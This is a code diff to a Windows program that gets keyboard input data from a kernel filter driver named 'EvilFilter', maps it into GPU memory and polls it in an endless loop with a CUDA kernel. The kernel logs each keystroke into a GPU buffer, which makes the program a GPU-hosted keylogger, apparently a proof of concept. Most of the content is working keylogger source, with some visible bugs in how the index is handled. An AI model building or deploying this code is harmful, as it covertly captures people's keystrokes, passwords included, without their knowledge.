@@ -17,36 +17,37 @@
 #include <DbgEng.h>
 #include <process.h>
 #include <psapi.h>
+#include <time.h>
 
 #define DEBUG 1
 
-__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer) { // , PCHAR KeyMap
-	USHORT lastMakeCode = 0;
-	ULONG bufferPosition = 0;
+__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) { // , PCHAR KeyMap
 	int index = blockIdx.x*blockDim.x + threadIdx.x;
 	if (index == 0) {
-		while (TRUE) {
-			if (lastMakeCode != keyboardData->MakeCode) { // keyboardData->MakeCode != 0
-				cudaBuffer[bufferPosition++] = KeyMap[keyboardData->MakeCode];
-#ifdef DEBUG
-				printf(" %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
-					keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
-					keyboardData->MakeCode,
-					KeyMap[keyboardData->MakeCode],
-					keyboardData->UnitId,
-					keyboardData->Flags,
-					keyboardData->Reserved,
-					keyboardData->ExtraInformation);
-				printf(" raw:");
-				PCHAR p = (PCHAR)keyboardData;
-				for (int i = 0; i < 12; i++) {
-					printf("[0x%x]", p[i]);
-
-				}
-				printf("\n");
-#endif
-				lastMakeCode = keyboardData->MakeCode;
+		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
+			if (*keystrokeIndex < 9998) {
+				cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
 			}
+
+			printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
+				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
+				keyboardData->MakeCode,
+				KeyMap[keyboardData->MakeCode],
+				keyboardData->UnitId,
+				keyboardData->Flags,
+				keyboardData->Reserved,
+				keyboardData->ExtraInformation);
+			printf(" raw:");
+			PCHAR p = (PCHAR)keyboardData;
+			for (int i = 0; i < 12; i++) {
+				printf("[0x%x]", p[i]);
+
+			}
+			printf("\n");
+
+			*lastMake = keyboardData->MakeCode;
+			*lastModifier = keyboardData->Flags;
+				
 		}
 	}
 }
@@ -135,6 +136,12 @@ int main(int argc, _TCHAR* argv[]) {
 			else {
 				PCHAR cudaKeyMap;
 				PCHAR cudaBuffer;
+				PUSHORT lastMake;
+				PUSHORT lastModifier;
+				PULONG keystrokeIndex;
+				UCHAR init0 = 666;
+				ULONG init0long = 0;
+
 
 				printf("Ioctl to EvilFilter device succeeded \n");
 				printf("keyboardData=[0x%lx]\n", keyboardData);
@@ -145,10 +152,24 @@ int main(int argc, _TCHAR* argv[]) {
 				checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));
 
 
-				printf("Allocating cudaKeyMap...\n");
-				checkCudaErrors(cudaMalloc(&cudaBuffer, 1000000000));
+				printf("Allocating lastMake...\n");
+				checkCudaErrors(cudaMalloc(&lastMake, sizeof(USHORT)));
+				printf("Allocating lastModifier...\n");
+				checkCudaErrors(cudaMalloc(&lastModifier, sizeof(USHORT)));
+				printf("Allocating keystrokeIndex...\n");
+				checkCudaErrors(cudaMalloc(&keystrokeIndex, sizeof(ULONG)));
+
+				printf("Allocating cudaBuffer...\n");
+				checkCudaErrors(cudaMalloc(&cudaBuffer, sizeof(CHAR) * 10000));
 				printf("Allocating cudaKeyMap...\n");
 				checkCudaErrors(cudaMalloc((void **)&cudaKeyMap, sizeof(char) * 84));
+
+				printf("Copying 0 to lastMake...");
+				checkCudaErrors(cudaMemcpy(lastMake, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
+				printf("Copying 0 to lastModifier...");
+				checkCudaErrors(cudaMemcpy(lastModifier, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
+				printf("Copying 0 to keystrokeIndex...");
+				checkCudaErrors(cudaMemcpy(keystrokeIndex, &init0long, sizeof(ULONG), cudaMemcpyHostToDevice));	printf("coppied.\n");
 				printf("Copying KeyMap to cudaKeyMap...");
 				checkCudaErrors(cudaMemcpy(cudaKeyMap, KeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	printf("coppied.\n");
 
@@ -156,12 +177,14 @@ int main(int argc, _TCHAR* argv[]) {
 				checkCudaErrors(cudaHostRegister(keyboardData, 10 * sizeof(char), cudaHostRegisterMapped));
 				printf("getting device pointer for KeyboardData...\n");
 				checkCudaErrors(cudaHostGetDevicePointer((void **)&cudaKeyboardData, (void *)keyboardData, 0));
-
+				// TODO: make last make code and last flag here and pass them back and forth to the CUDA kernel
 				printf("Launching CUDA process...");
 				dim3 grid(1);
 				dim3 block(1); 
-				logKeyboardData <<<grid, block >>>(cudaKeyboardData, cudaKeyMap, cudaBuffer);
-				checkCudaErrors(cudaDeviceSynchronize());
+				while (TRUE) {
+					logKeyboardData <<<grid, block >>>(cudaKeyboardData, cudaKeyMap, cudaBuffer, lastMake, lastModifier, keystrokeIndex);
+					checkCudaErrors(cudaDeviceSynchronize());
+				}
 				printf("Launched.\n");
 			}
 		}
@@ -169,85 +192,5 @@ int main(int argc, _TCHAR* argv[]) {
 	}
 	printf("fin.\n");
 	return 0;
-}
-
-PVOID GetPdeAddress(PVOID virtualaddr) {
-	ULONG pageDirectoryIndex = GetPageDirectoryIndex(virtualaddr);
-	PVOID pageDirectory = (PVOID)(getPageDirectoryBase() + (pageDirectoryIndex * getPdeSize()));
-	printf("pageDirectoryTable   [0x%lx] ", pageDirectory);
-	if ((pageDirectory)) {
-		return pageDirectory;
-	}
-	else {
-		printf(" is INVALID\n");
-		return NULL;
-	}
-}
-
-PVOID GetPteAddress(PVOID virtualaddr) {
-	ULONG pageDirectoryIndex = GetPageDirectoryIndex(virtualaddr);
-	ULONG pageTableIndex = GetPageTableIndex(virtualaddr);
-	PVOID pageTable = (PVOID)(getPageTableBase() + (pageTableIndex * getPteSize()) + (PAGE_SIZE * pageDirectoryIndex));
-	printf("pageTable   [0x%lx] \n", pageTable);
-	if ((pageTable)) {
-		return pageTable;
-	}
-	else {
-		printf(" is INVALID\n");
-		return NULL;
-	}
-}
-
-ULONG getPdeSize() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PDE_SIZE;
-	}
-	else {
-		return X32_PDE_SIZE;
-	}
-}
-ULONG getPteSize() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PTE_SIZE;
-	}
-	else {
-		return X32_PTE_SIZE;
-	}
-}
-
-
-ULONG getPageDirectoryBase() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PROCESS_PAGE_DIRECTORY_BASE;
-	}
-	else {
-		return X32_PROCESS_PAGE_DIRECTORY_BASE;
-	}
-}
-
-ULONG getPageTableBase() {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return PAE_PROCESS_PAGE_TABLE_BASE;
-	}
-	else {
-		return X32_PROCESS_PAGE_TABLE_BASE;
-	}
-}
-
-ULONG GetPageTableIndex(PVOID virtualaddr) {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return (ULONG)virtualaddr >> 12 & 0x01FF;
-	}
-	else {
-		return (ULONG)virtualaddr >> 12 & 0x03FF;
-	}
-}
-ULONG GetPageDirectoryIndex(PVOID virtualaddr) {
-	if (IsProcessorFeaturePresent(PF_PAE_ENABLED)) {
-		return (ULONG)virtualaddr >> 21;
-	}
-	else {
-		return (ULONG)virtualaddr >> 22;
-	}
 }
 
